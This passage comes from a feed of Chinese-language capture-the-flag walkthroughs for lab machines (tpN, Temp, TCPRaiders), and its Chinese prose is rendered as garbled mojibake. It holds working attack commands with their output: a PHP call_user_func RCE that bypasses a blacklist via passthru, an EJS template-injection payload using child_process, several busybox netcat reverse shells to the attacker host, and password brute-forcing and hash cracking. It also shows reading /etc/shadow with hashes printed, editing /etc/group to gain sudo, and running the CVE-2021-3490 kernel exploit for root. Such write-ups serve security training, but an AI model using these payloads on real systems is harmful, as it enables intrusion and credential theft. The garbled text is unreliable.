  Âú® `Admin` ÊéßÂà∂Âô®‰∏≠ÂèëÁé∞‰∏Ä‰∏™ `hello` ÊñπÊ≥ïÔºåÂÖ∂Ê†∏ÂøÉ‰ª£Á†Å‰∏∫ `call_user_func($b, $a);`„ÄÇËøôÊòØ‰∏Ä‰∏™ÂÖ∏ÂûãÁöÑÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºåÂÖ∂‰∏≠ÂèÇÊï∞ `$a` Âíå `$b` ÂùáÂèØÈÄöËøáURL‰º†ÂÖ•ÔºåÊÑèÂë≥ÁùÄÊàë‰ª¨ÂèØ‰ª•ÊéßÂà∂Ë∞ÉÁî®ÁöÑÂáΩÊï∞Ôºà`$b`ÔºâÂíåÂÖ∂ÂèÇÊï∞Ôºà`$a`Ôºâ„ÄÇ

  ```php
  public function hello($a,$b)
  {
      call_user_func($b, $a); // ÊºèÊ¥ûÁÇπ
  }
  ```

* **`app/admin/route/app.php`**:
  Ë∑ØÁî±Êñá‰ª∂ÊòæÁ§∫Ôºå`sb/:a/:b` Ë∑ØÂæÑË¢´ÁªëÂÆöÂà∞‰∫Ü `Admin/hello` ÊñπÊ≥ï„ÄÇÂºÄÂèëËÄÖÊ≥®Èáä‚Äú‰∏çÁü•ÈÅì‰∏∫‰ªÄ‰πàÊàëËøô‰∏™Ë∑ØÁî±ÊòØÊó†ÊïàÁöÑ‚ÄùÔºå‰ΩÜÂÆûÈôÖ‰∏äÔºåÁî±‰∫éÂ∫îÁî®Êò†Â∞ÑÁöÑÈÖçÁΩÆ (`'app_map' =&gt; ['think'=&gt;'admin']`)ÔºåËÆøÈóÆË∑ØÂæÑÂ∫î‰∏∫ `/think/admin/hello/...`„ÄÇ

  ```php
  Route::rule('sb/:a/:b','Admin/hello');
  ```

* **`app/middleware/Check1.php`**:
  `Admin` ÊéßÂà∂Âô®‰ΩøÁî®‰∫Ü `Check1` ‰∏≠Èó¥‰ª∂ÔºåÂÆÉ‰ºöÊ†°È™å `Session` ‰∏≠ÁöÑ `sb` Âíå `token` ÊòØÂê¶Áõ∏Á≠â‰∏î‰∏ç‰∏∫Á©∫ÔºåËøôÊòØ‰∏Ä‰∏™ÁÆÄÂçïÁöÑË∫´‰ªΩÈ™åËØÅ„ÄÇ

  ```php
  if ((Session::get('sb')==Session::get('token')&amp;&amp;!empty(Session::get('sb'))&amp;&amp;!empty(Session::get('token')))){
      return $next($request);
  }
  ```

* **`app/middleware/Check.php`**:
  Â≠òÂú®‰∏Ä‰∏™ÂÖ®Â±Ä‰∏≠Èó¥‰ª∂ÔºåÈÄöËøáÈªëÂêçÂçïÊ≠£ÂàôËøáÊª§URL‰∏≠ÁöÑÂç±Èô©ÂáΩÊï∞ÔºåÂ¶Ç `system`, `exec`, `eval` Á≠â„ÄÇ‰ΩÜ `passthru` Á≠âÂáΩÊï∞Âπ∂Êú™Âú®ÈªëÂêçÂçï‰∏≠ÔºåÂèØ‰ª•ÁªïËøá„ÄÇ

  ```php
  $pattern = '/\b(eval|exec|system|...|phpinfo)\b/i';
  ```

# ‰∏â„ÄÅÊºèÊ¥ûÂà©Áî®

## 1. Ëé∑ÂèñToken

Ê†πÊçÆ‰ª£Á†ÅÂÆ°ËÆ°ÔºåÈúÄË¶ÅÂÖàËé∑Âèñ‰∏Ä‰∏™ÂêàÊ≥ïÁöÑ `token` ÊâçËÉΩËÆøÈóÆÂêéÂè∞ÊéßÂà∂Âô®„ÄÇ`app/index/controller/Token.php` Êñá‰ª∂ÈÄªËæëÊòæÁ§∫ÔºåÂêë `/index.php/index/token/token` ÂèëÈÄÅ `sb=admin` ÁöÑPOSTËØ∑Ê±ÇÂç≥ÂèØËé∑Âæó`token`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl http://192.168.205.131:8080/index.php/index/token/token -d 'sb=admin' -c cookie.txt
...
&lt;p class='message'&gt;Ëé∑ÂèñÊàêÂäü: 2fce588f94d6d5edcfea90156254f130a4aed575&lt;/p&gt;
...
```

## 2. RCEÊâßË°åÂëΩ‰ª§

Êê∫Â∏¶‰∏ä‰∏ÄÊ≠•Ëé∑ÂèñÁöÑ`cookie`ÔºåÊûÑÈÄ†PayloadËÆøÈóÆÊºèÊ¥ûË∑ØÁî±„ÄÇÊàë‰ª¨‰ΩøÁî® `passthru` ÂáΩÊï∞ÁªïËøáÈªëÂêçÂçïÊ£ÄÊµãÔºåÊâßË°å `id` ÂëΩ‰ª§„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl http://192.168.205.131:8080/think/admin/hello/a/id/b/passthru -b cookie.txt
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

ÂëΩ‰ª§ÊàêÂäüÊâßË°åÔºåÂΩìÂâçÁî®Êà∑‰∏∫ `www-data`„ÄÇ

## 3. ÂèçÂºπShell

Âú®Êú¨Âú∞ÁõëÂê¨Á´ØÂè£Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nc -lvnp 8888                        
listening on [any] 8888 ...
```

ÊûÑÈÄ†ÂèçÂºπShellÁöÑPayloadÔºåÂπ∂ËøõË°åURLÁºñÁ†ÅÂêéÂèëÈÄÅÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl http://192.168.205.131:8080/think/admin/hello/a/busybox%20nc%20192%2E168%2E205%2E128%208888%20%2De%20bash/b/passthru -b cookie.txt
```

ÊàêÂäüÊé•Êî∂Âà∞ÂèçÂºπShellÔºåÂπ∂‰ΩøÁî®`script`Âíå`stty`Á≠âÂëΩ‰ª§ÂçáÁ∫ß‰∏∫‰∫§‰∫íÂºèTTY„ÄÇ

# Âõõ„ÄÅÊùÉÈôêÊèêÂçá

## 1. Áî®Êà∑ÂàáÊç¢

Âú® `/home` ÁõÆÂΩï‰∏ãÂèëÁé∞ `welcome` Áî®Êà∑ÔºåÂπ∂Âú®ÂÖ∂ÂÆ∂ÁõÆÂΩï‰∏≠ÊâæÂà∞‰∏Ä‰∏™Âêç‰∏∫ `.pwd` ÁöÑÂèØÁñëÊñá‰ª∂ÔºåËøôÂèØËÉΩÊòØ‰∏Ä‰∏™ÂØÜÁ†ÅÂ≠óÂÖ∏„ÄÇ

```bash
www-data@tpN:/home/welcome$ ls -al
...
-rw-r--r-- 1 root    root    3510 Jul 22 09:56 .pwd
-rw-r--r-- 1 root    root      26 Jul 24 09:27 uesr.txt
```

Â∞Ü`suForce`‰∏ä‰º†Âà∞ÁõÆÊ†áÊúçÂä°Âô®ÔºåÂπ∂‰ΩøÁî®`suForce`Â∑•ÂÖ∑ËøõË°åÁàÜÁ†¥„ÄÇ

```bash
www-data@tpN:/tmp$ ./suForce -u welcome -w pass
...
üí• Password | eecho
...
```

ÊàêÂäüÁàÜÁ†¥Âá∫ `welcome` Áî®Êà∑ÁöÑÂØÜÁ†Å‰∏∫ `eecho`„ÄÇÂàáÊç¢Áî®Êà∑ÊàêÂäü„ÄÇ

```bash
www-data@tpN:/tmp$ su welcome
Password: eecho
welcome@tpN:/tmp$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

## 2. ÂÜÖÊ†∏ÊºèÊ¥ûÊèêÊùÉ

ÂàáÊç¢Âà∞ `welcome` Áî®Êà∑ÂêéÔºåÊâßË°å `sudo -l` ÂèëÁé∞Ê≤°ÊúâsudoÊùÉÈôê„ÄÇ‰∏ä‰º†Âπ∂ËøêË°å `linpeas.sh` ËÑöÊú¨ËøõË°åÊèêÊùÉÊºèÊ¥ûÊâ´ÊèèÔºåÂèëÁé∞Á≥ªÁªüÂÜÖÊ†∏ÂèØËÉΩÂ≠òÂú® **CVE-2021-3490** ÊºèÊ¥û„ÄÇ

```bash
...
[+] [CVE-2021-3490] eBPF ALU32 bounds tracking for bitwise ops
   Details: https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story
   Exposure: probable
...
```

‰∏ãËΩΩÂπ∂ÁºñËØëËØ•ÊºèÊ¥ûÁöÑexploit„ÄÇ

```bash
welcome@tpN:/tmp$ busybox wget https://.../CVE-2021-3490/zip/main
welcome@tpN:/tmp$ unzip main 
welcome@tpN:/tmp/Linux_LPE_eBPF_CVE-2021-3490-main$ make
gcc -DGROOVY -o bin/exploit.bin -I include/ exploit.c bpf.c kmem_search.c
```

ÊâßË°åexploitÔºåÊàêÂäüËé∑ÂèñrootÊùÉÈôê„ÄÇ

```bash
welcome@tpN:/tmp/Linux_LPE_eBPF_CVE-2021-3490-main/bin$ ./exploit.bin 
...
[!] preparing to overwrite creds...
[+] success! enjoy r00t :)
# id
uid=0(root) gid=0(root) groups=0(root),1000(welcome)
```

# ‰∫î„ÄÅÂ§∫ÂèñFlag

Âú®rootÊùÉÈôê‰∏ãÔºåËØªÂèñÁî®Êà∑ÂíårootÁöÑflag„ÄÇ

```bash
root@tpN:/# cat /root/root.txt /home/welcome/uesr.txt 
flag{root-‰∏çÈîô‰∏çÈîô}
flag{user-eecho123456789}
```

Ê∏óÈÄèÊµãËØïÂÆåÊàê„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_tpN.html</guid><pubDate>Sat, 16 Aug 2025 01:25:13 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Temp</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Temp.html</link><description># **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

È¶ñÂÖàÔºåÂú®ÁõÆÊ†áÁΩëÊÆµÂÜÖ‰ΩøÁî®`arp-scan`ËøõË°å‰∏ªÊú∫ÂèëÁé∞Ôºå‰ª•Á°ÆÂÆöÁõÆÊ†áÁöÑIPÂú∞ÂùÄ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.132 08:00:27:72:8f:66       PCS Systemtechnik GmbH
...
```

Á°ÆÂÆöÁõÆÊ†áIP‰∏∫ `192.168.205.132` ÂêéÔºå‰ΩøÁî®`nmap`ÂØπÂÖ∂ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•Êé¢ÊµãÂºÄÊîæÁöÑÁ´ØÂè£ÂíåÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p0-65535 192.168.205.132
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 09:47 EDT
Nmap scan report for 192.168.205.132
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
MAC Address: 08:00:27:72:8F:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÁõÆÊ†áÂºÄÊîæ‰∫Ü22 (SSH)„ÄÅ80 (HTTP) Âíå 3000 (PPP, ÂÆûÈôÖ‰∏∫WebÊúçÂä°) Á´ØÂè£„ÄÇ

# **‰∫å„ÄÅÊºèÊ¥ûÂà©Áî®**

ËÆøÈóÆÁõÆÊ†á80Á´ØÂè£ÔºåÂèëÁé∞ÊòØ‰∏Ä‰∏™Âêç‰∏∫ 'Safe Welcome Message Processor' ÁöÑWebÂ∫îÁî®„ÄÇËÆøÈóÆ3000Á´ØÂè£ÔºåÂàôÊòØ‰∏Ä‰∏™ÂäüËÉΩÁõ∏‰ººÁöÑ 'Welcome Message Processor' Â∫îÁî®„ÄÇ

ÁªèËøáÊµãËØïÔºåÂèëÁé∞3000Á´ØÂè£ÁöÑWebÂ∫îÁî®Â≠òÂú®ÊúçÂä°Âô®Á´ØÊ®°ÊùøÊ≥®ÂÖ•ÔºàSSTIÔºâÊºèÊ¥û„ÄÇÈÄöËøáÊèê‰∫§payload `&lt;%= 7*7 %&gt;`ÔºåÊúçÂä°Âô®ÊàêÂäüÊâßË°å‰∫Ü‰πòÊ≥ïËøêÁÆóÂπ∂ËøîÂõû‰∫ÜÁªìÊûú `49`ÔºåÁ°ÆËÆ§‰∫ÜÊºèÊ¥ûÁöÑÂ≠òÂú®„ÄÇ

![image-20250815215732917](http://7r1UMPHK.github.io/image/20250815224342800.webp)

‰∏∫‰∫ÜËøõ‰∏ÄÊ≠•Âà©Áî®Ê≠§ÊºèÊ¥ûÔºåÊûÑÈÄ†‰∫Ü‰∏Ä‰∏™ÂèØ‰ª•ÊâßË°åÁ≥ªÁªüÂëΩ‰ª§ÁöÑpayload„ÄÇËØ•payloadÂà©Áî®Node.jsÁöÑ`child_process`Ê®°ÂùóÊù•ÊâßË°å`id`ÂëΩ‰ª§ÔºåÂπ∂ÂõûÊòæÁªìÊûú„ÄÇ

**ÂëΩ‰ª§ÊâßË°åPayload:**

```javascript
&lt;% const require = this.process.mainModule.require; const { execSync } = require('child_process'); const output = execSync('id'); %&gt;&lt;%= output %&gt;
```

![image-20250815215910295](http://7r1UMPHK.github.io/image/20250815224346104.webp)

ÊúçÂä°Âô®ÊàêÂäüËøîÂõû‰∫Ü`uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)`ÔºåË°®ÊòéÂëΩ‰ª§Â∑≤Âú®ÁõÆÊ†áÁ≥ªÁªü‰∏ä‰ª•`welcome`Áî®Êà∑Ë∫´‰ªΩÊâßË°å„ÄÇ

Êé•‰∏ãÊù•ÔºåÂà©Áî®ËØ•ÊºèÊ¥ûËé∑Âèñ‰∏Ä‰∏™ÂèçÂêëshell„ÄÇÈ¶ñÂÖàÂú®KaliÊîªÂáªÊú∫‰∏äËÆæÁΩÆNetcatÁõëÂê¨8888Á´ØÂè£„ÄÇ

**KaliÁõëÂê¨:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lvnp 8888
listening on [any] 8888 ...
```

ÁÑ∂ÂêéÔºåÂú®WebÈ°µÈù¢Êèê‰∫§ÂèçÂºπshellÁöÑpayload„ÄÇ

**ÂèçÂºπShell Payload:**

```javascript
&lt;% const require = this.process.mainModule.require; const { execSync } = require('child_process'); const output = execSync('busybox nc 192.168.205.128 8888 -e /bin/bash'); %&gt;&lt;%= output %&gt;
```

Êèê‰∫§ÂêéÔºåÊàêÂäüÂú®Kali‰∏äÊé•Êî∂Âà∞Êù•Ëá™ÁõÆÊ†á‰∏ªÊú∫ÁöÑshell„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.132] 43342
id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

‰∏∫‰∫ÜËé∑ÂæóÊõ¥Â•ΩÁöÑ‰∫§‰∫í‰ΩìÈ™åÔºåÂØπËé∑ÂèñÁöÑshellËøõË°åÁ®≥ÂÆöÂåñÂ§ÑÁêÜ„ÄÇ

```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80
```

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

Âú®Ëé∑Âèñ‰∫Ü`welcome`Áî®Êà∑ÁöÑshellÂêéÔºåÂºÄÂßãËøõË°åÊèêÊùÉÊìç‰Ωú„ÄÇÈ¶ñÂÖàÔºåÊ£ÄÊü•Áî®Êà∑ÁöÑ`sudo`ÊùÉÈôê„ÄÇ

```bash
welcome@Temp:/opt/ssti-welcome$ sudo -l
...
User welcome may run the following commands on Temp:
    (ALL) NOPASSWD: /usr/sbin/reboot
```

`sudo -l`ÁªìÊûúÊòæÁ§∫`welcome`Áî®Êà∑Âè™ËÉΩ‰ª•`NOPASSWD`ÊñπÂºèÊâßË°å`/usr/sbin/reboot`ÂëΩ‰ª§ÔºåÊ≠§ÊùÉÈôêÂØπÊèêÊùÉÊ≤°ÊúâÁõ¥Êé•Â∏ÆÂä©„ÄÇ

Êé•ÁùÄÔºåÂú®Áî®Êà∑ÂÆ∂ÁõÆÂΩï‰∏ãÂèëÁé∞Âπ∂ËØªÂèñ‰∫Ü`user.txt`Êñá‰ª∂ÔºåËé∑Âæó‰∫ÜÁ¨¨‰∏Ä‰∏™flag„ÄÇ

```bash
welcome@Temp:~$ cat user.txt
flag{user-12f54a96f64443246930da001cafda8b}
```

‰∏∫‰∫ÜÊõ¥ÂÖ®Èù¢Âú∞Êî∂ÈõÜÁ≥ªÁªü‰ø°ÊÅØÔºå‰∏ä‰º†Âπ∂ÊâßË°å`linpeas.sh`ËÑöÊú¨ËøõË°åËá™Âä®ÂåñÊûö‰∏æ„ÄÇ

```bash
welcome@Temp:~$ cd /tmp
welcome@Temp:/tmp$ busybox wget 192.168.205.128/linpeas.sh
welcome@Temp:/tmp$ bash /tmp/linpeas.sh
...
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
‚ïö https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
...
/etc/group
...
```

`linpeas`ÁöÑÊâ´ÊèèÁªìÊûúÊòæÁ§∫`/etc/group`Êñá‰ª∂ÂØπ‰∫éÂΩìÂâçÁî®Êà∑ÊòØÂèØÂÜôÁöÑÔºåËøôÊòØ‰∏Ä‰∏™ÂÖ≥ÈîÆÁöÑÊèêÊùÉÂêëÈáè„ÄÇÊàë‰ª¨ÂèØ‰ª•ÈÄöËøá‰øÆÊîπËØ•Êñá‰ª∂ÔºåÂ∞Ü`welcome`Áî®Êà∑Ê∑ªÂä†Âà∞`sudo`Êàñ`shadow`Á≠âÈ´òÊùÉÈôêÁî®Êà∑ÁªÑ„ÄÇ

‰∏∫‰∫ÜËÉΩÂ§üËØªÂèñ`/etc/shadow`Êñá‰ª∂‰ª•Á†¥Ëß£Áî®Êà∑ÂØÜÁ†ÅÔºåÂÜ≥ÂÆöÂ∞Ü`welcome`Áî®Êà∑Ê∑ªÂä†Âà∞`shadow`ÁªÑ„ÄÇ

## **1. ÈÖçÁΩÆSSHÂÖçÂØÜÁôªÂΩï**

Áî±‰∫é‰∏çÁü•ÈÅì`welcome`Áî®Êà∑ÁöÑÂØÜÁ†ÅÔºåÊó†Ê≥ïÁõ¥Êé•ÂàáÊç¢ÁªÑ„ÄÇÂõ†Ê≠§ÔºåÈ¶ñÂÖàÈÖçÁΩÆSSHÂÖçÂØÜÁôªÂΩïÔºå‰ª•‰æøÂú®‰øÆÊîπ`/etc/group`ÂêéËÉΩ‰ª•Êñ∞ÁªÑÁöÑË∫´‰ªΩÈáçÊñ∞ÁôªÂΩï„ÄÇ

Âú®`welcome`Áî®Êà∑ÂÆ∂ÁõÆÂΩï‰∏ãÂàõÂª∫`.ssh`ÁõÆÂΩïÔºåÂπ∂‰ªéKaliÊîªÂáªÊú∫‰∏ãËΩΩ`authorized_keys`Êñá‰ª∂„ÄÇ

```bash
welcome@Temp:~$ mkdir .ssh
welcome@Temp:~$ cd .ssh/
welcome@Temp:~/.ssh$ busybox wget 192.168.205.128/authorized_keys
```

## **2. ‰øÆÊîπ`/etc/group`**

‰ΩøÁî®`vim`ÊàñÂÖ∂‰ªñÁºñËæëÂô®ÊâìÂºÄ`/etc/group`Êñá‰ª∂ÔºåÂ∞Ü`welcome`Áî®Êà∑Ê∑ªÂä†Âà∞`shadow`ÁªÑÂíå`sudo`ÁªÑ„ÄÇ

```bash
welcome@Temp:~/.ssh$ vim /etc/group
```

‰øÆÊîπÂêéÁöÑÂÜÖÂÆπÂ¶Ç‰∏ãÔºö

```
...
sudo:x:27:welcome
...
shadow:x:42:welcome
...
```

## **3. ËØªÂèñshadowÊñá‰ª∂Âπ∂Á†¥Ëß£ÂØÜÁ†Å**

‰øÆÊîπÂÆåÊàêÂêéÔºå‰ªéKaliÊîªÂáªÊú∫ÈÄöËøáSSHËøûÊé•Âà∞ÁõÆÊ†áÔºåÊ≠§Êó∂`welcome`Áî®Êà∑Â∑≤ÂÖ∑Â§á`shadow`ÁªÑÁöÑÊùÉÈôêÔºåÂèØ‰ª•Áõ¥Êé•ËØªÂèñ`/etc/shadow`Êñá‰ª∂„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ ssh welcome@192.168.205.132
...
welcome@Temp:~$ cat /etc/shadow
root:$6$OJ3tCiDX7okU1mml$K5.VqI9J/kSkDxb.et6AWCJnfN0//2VmsjZlwdBCeDK2MgHpojEVMs7hd3FAuQ1EYIJpHnUMMR.pz3uQvpzGr1:20293:0:99999:7:::
...
welcome:$6$5aPJr2PfLEe1OJqk$vcaYOfDgCNO.G.PkNFM0Lj2CS803S5FSogWPHcZSPTSjSEec1YveEGhJ0JXnEGlzRxx1BlH0UJeIIbP7RN2XT.:20293:0:99999:7:::
```

Â∞Ü`welcome`Áî®Êà∑ÁöÑÂØÜÁ†ÅÂìàÂ∏å‰øùÂ≠ò‰∏ãÊù•Ôºå‰ΩøÁî®`John the Ripper`Âíå`rockyou.txt`Â≠óÂÖ∏ËøõË°åÁ†¥Ëß£„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ echo 'welcome:$6$5aPJr2PfLEe1OJqk$vcaYOfDgCNO.G.PkNFM0Lj2CS803S5FSogWPHcZSPTSjSEec1YveEGhJ0JXnEGlzRxx1BlH0UJeIIbP7RN2XT.' &gt; hash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
...
sainsburys       (welcome)
...
Session completed.
```

ÊàêÂäüÁ†¥Ëß£Âá∫`welcome`Áî®Êà∑ÁöÑÂØÜÁ†Å‰∏∫ `sainsburys`„ÄÇ

## **4. Ëé∑ÂèñRootÊùÉÈôê**

Áî±‰∫é‰πãÂâçÂ∑≤Â∞Ü`welcome`Áî®Êà∑Ê∑ªÂä†Âà∞‰∫Ü`sudo`ÁªÑÔºåÁé∞Âú®ÂèØ‰ª•Áõ¥Êé•‰ΩøÁî®Á†¥Ëß£Âá∫ÁöÑÂØÜÁ†ÅÂàáÊç¢Âà∞rootÁî®Êà∑„ÄÇ

```bash
welcome@Temp:~$ sudo bash
[sudo] password for welcome: sainsburys
root@Temp:/home/welcome# id
uid=0(root) gid=0(root) groups=0(root)
```

ÊàêÂäüËé∑ÂèñrootÊùÉÈôêÂêéÔºåËØªÂèñ`/root/root.txt`Âíå`/home/welcome/user.txt`ÔºåËé∑ÂæóÊâÄÊúâflag„ÄÇ

```bash
root@Temp:/home/welcome# cat /root/root.txt /home/welcome/user.txt
flag{root-60b725f10c9c85c70d97880dfe8191b3}
flag{user-12f54a96f64443246930da001cafda8b}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Temp.html</guid><pubDate>Fri, 15 Aug 2025 14:48:12 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_TCPRaiders</title><link>https://7r1UMPHK.github.io/post/nei-bu-_TCPRaiders.html</link><description># **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

## **1. ‰∏ªÊú∫ÂèëÁé∞**

È¶ñÂÖàÂú®Êú¨Âú∞ÁΩëÁªú‰∏≠‰ΩøÁî® `arp-scan` Êâ´ÊèèÊú¨Âú∞ÁΩëÁªúÔºå‰ª•Á°ÆÂÆöÁõÆÊ†á‰∏ªÊú∫ÁöÑIPÂú∞ÂùÄ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.146        08:00:27:39:c8:97       PCS Systemtechnik GmbH
...
```

‰ªéÊâ´ÊèèÁªìÊûúÂèØÁü•ÔºåÁõÆÊ†áÈù∂Êú∫ÁöÑIPÂú∞ÂùÄ‰∏∫ `192.168.205.146`„ÄÇ

## **2. Á´ØÂè£Êâ´Êèè**

‰ΩøÁî® `nmap` ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•ËØÜÂà´ÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p0-65535 192.168.205.146
...
0/tcp open  unknown
...
```

0Á´ØÂè£ÊòØ‰∏çÂÖÅËÆ∏ÊµèËßàÂô®ËÆøÈóÆÁöÑÔºåÊâÄ‰ª•ËΩ¨Âèë‰∏Ä‰∏ã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ socat TCP-LISTEN:8000,fork TCP4:192.168.205.146:0 &amp;    
[1] 23767
```

# **‰∫å„ÄÅÊºèÊ¥ûÂèëÁé∞‰∏éÂàùÂßãËÆøÈóÆ**

## 1.Web

ËÆøÈóÆÊú¨Âú∞8000Á´ØÂè£

![image-20250815112328650](http://7r1UMPHK.github.io/image/20250815213356794.webp)

Â∞ùËØïcurlÂä©ÂäõÈìæÊé•ÊòæÁ§∫Âä©ÂäõÊàêÂäüÔºåÂπ∂‰∏îÈáçÊñ∞curlÊòæÁ§∫Âä©ÂäõËøá‰∫ÜÔºåÂ∫îËØ•ÊòØÂ≠òÂú®IPÊ£ÄÊµãÁöÑÈóÆÈ¢ò„ÄÇÊµãËØïÂèëÁé∞ÔºåËØ•IPÊ£ÄÊµãÂè™Ê£ÄÊµãIPÂú∞ÂùÄÁöÑÂâç16‰ΩçÔºåÂç≥ `x.x.1.1` Ê†ºÂºèÂç≥ÂèØÔºåÈÇ£ÂÜôÊâπÈáèÂä©ÂäõËÑöÊú¨„ÄÇ

```perl
perl -MLWP::UserAgent -e '$ua=LWP::UserAgent-&gt;new(timeout=&gt;1);for $i (0..255){for $j (0..255){$ip='$i.$j.1.1';$ua-&gt;get('http://192.168.205.128:8000/support?token=eb0c6310-07b2-4609-9f3e-4a59ce09949a','X-Forwarded-For'=&gt;$ip);print '$ip\n';}}'
```

Âú®ËÑöÊú¨ÊâßË°åÂÆåÊàêÂêéÔºåÂÜçÊ¨°ËÆøÈóÆWebÊúçÂä°ÔºåÂèëÁé∞‰πãÂâçÈöêËóèÁöÑÈ°µÈù¢ÊòØWebshell„ÄÇ

## **2. Ëé∑ÂèñÂèçÂºπShell**

ÈÄöËøáÊñ∞Âá∫Áé∞ÁöÑWebshellÁïåÈù¢ÔºåÊàë‰ª¨ÊâßË°åÂèçÂºπshellÂëΩ‰ª§„ÄÇÁî±‰∫éÁõÆÊ†áÁ≥ªÁªü‰∏∫ Alpine LinuxÔºåÂÆÉÈªòËÆ§‰∏çÂåÖÂê´ `bash`ÔºåÂõ†Ê≠§Êàë‰ª¨‰ΩøÁî® `busybox` ÂÜÖÁΩÆÁöÑ `nc` Âíå `ash` Êù•Ëé∑ÂèñÂèçÂºπshell„ÄÇ

**Êú¨Âú∞KaliÂºÄÂêØÁõëÂê¨:**

```bash
nc -lvnp 8888
```

**Âú®Webshell‰∏≠ÊâßË°åPayload:**

```bash
busybox nc 192.168.205.128 8888 -e /bin/ash
```

ÊâßË°åÂêéÔºåÂú®Êú¨Âú∞ `8888` Á´ØÂè£ÊàêÂäüÊé•Êî∂Âà∞ `runner` Áî®Êà∑ÁöÑ‰∫§‰∫íÂºèShell„ÄÇ

## **3. Á®≥ÂÆöShell**

```
python3 -c 'import pty; pty.spawn('/bin/ash')'
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/ash
stty rows 24 columns 80
```

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

## **1. runner -&gt; luna**

Ëé∑ÂèñÂàùÊ≠•ShellÂêéÔºåÊâßË°å `sudo -l` Êü•ÁúãÂΩìÂâçÁî®Êà∑ÁöÑ `sudo` ÊùÉÈôê„ÄÇ

```bash
/opt/web $ sudo -l
...
User runner may run the following commands on tcpraiders:
    (luna) NOPASSWD: /usr/sbin/luna
```

ÁªìÊûúÊòæÁ§∫ `runner` Áî®Êà∑ÂèØ‰ª•ÂÖçÂØÜ‰ª• `luna` Áî®Êà∑Ë∫´‰ªΩËøêË°å `/usr/sbin/luna` Á®ãÂ∫è„ÄÇ

Â∞ùËØïÊâßË°åËØ•Á®ãÂ∫èÔºåÂèëÁé∞ÂÆÉ‰ºöËæìÂá∫‰∏ÄÊÆµÂèçÂêëÁöÑËã±ÊñáÂ≠óÁ¨¶‰∏≤ÔºåÂπ∂Á≠âÂæÖËæìÂÖ•„ÄÇ

```bash
/opt/web $ sudo -u luna /usr/sbin/luna
.yranoitcid eht ni semit 511 dnuof neeb sah tI .kaew oot si drowssap ruoY :TRELA

# ‰ΩøÁî®revÂëΩ‰ª§ÂèçËΩ¨Â≠óÁ¨¶‰∏≤
/opt/web $ sudo -u luna /usr/sbin/luna | rev
ALERT: Your password is too weak. It has been found 115 times in the dictionary.
```

